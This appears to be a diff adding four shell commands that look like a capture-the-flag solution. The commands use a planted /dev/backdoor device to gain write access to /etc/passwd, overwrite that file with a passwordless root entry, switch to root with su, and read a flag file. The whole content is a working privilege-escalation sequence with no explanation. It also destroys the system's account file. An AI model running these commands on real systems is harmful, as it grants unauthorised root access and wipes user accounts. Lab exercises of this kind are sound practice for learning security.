@@ -1,0 +1,4 @@
+$ echo b4ckd00r:/etc/passwd:511 > /dev/backdoor
+$ echo root::0:0:root:/root:/bin/sh > /etc/passwd
+$ su
+# cat /root/flag*
